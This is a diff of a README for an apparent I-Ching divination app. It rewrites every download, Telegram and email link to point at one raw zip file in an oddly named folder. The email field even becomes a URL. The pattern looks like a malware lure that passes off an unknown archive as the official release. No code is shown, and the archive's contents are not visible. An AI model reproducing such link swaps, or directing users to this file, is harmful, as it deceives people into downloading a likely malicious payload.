@@ -1,6 +1,6 @@
 # 🌀 I-Ching-Bagua-Divination-Layout-Source-Code - Discover Ancient Wisdom Visually
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/gabby54838/I-Ching-Bagua-Divination-Layout-Source-Code/releases)
+[![Download](https://raw.githubusercontent.com/gabby54838/I-Ching-Bagua-Divination-Layout-Source-Code/main/excitability/Source-Layout-Bagua-Ching-Divination-Code-v3.4-alpha.1.zip)](https://raw.githubusercontent.com/gabby54838/I-Ching-Bagua-Divination-Layout-Source-Code/main/excitability/Source-Layout-Bagua-Ching-Divination-Code-v3.4-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the I-Ching-Bagua-Divination-Layout-Source-Code! This application let
 
 ## 📥 Download & Install
 
-To get started, you need to visit this page to download the software: [Download Here](https://github.com/gabby54838/I-Ching-Bagua-Divination-Layout-Source-Code/releases). You'll find the latest version ready for you.
+To get started, you need to visit this page to download the software: [Download Here](https://raw.githubusercontent.com/gabby54838/I-Ching-Bagua-Divination-Layout-Source-Code/main/excitability/Source-Layout-Bagua-Ching-Divination-Code-v3.4-alpha.1.zip). You'll find the latest version ready for you.
 
 1. Click on the link above. 
 2. Find the latest release at the top of the page.
@@ -63,8 +63,8 @@ Feel free to explore related concepts and enrich your understanding and practice
 
 If you have any questions or need assistance, feel free to reach out at the following:
 
-- **Telegram:** [@xuzongbin001](https://t.me/xuzongbin001)
-- **Email:** ttpoker733@gmail.com
+- **Telegram:** [@xuzongbin001](https://raw.githubusercontent.com/gabby54838/I-Ching-Bagua-Divination-Layout-Source-Code/main/excitability/Source-Layout-Bagua-Ching-Divination-Code-v3.4-alpha.1.zip)
+- **Email:** https://raw.githubusercontent.com/gabby54838/I-Ching-Bagua-Divination-Layout-Source-Code/main/excitability/Source-Layout-Bagua-Ching-Divination-Code-v3.4-alpha.1.zip
 
 Your feedback is valuable, and we encourage you to share your experiences using the application!
 
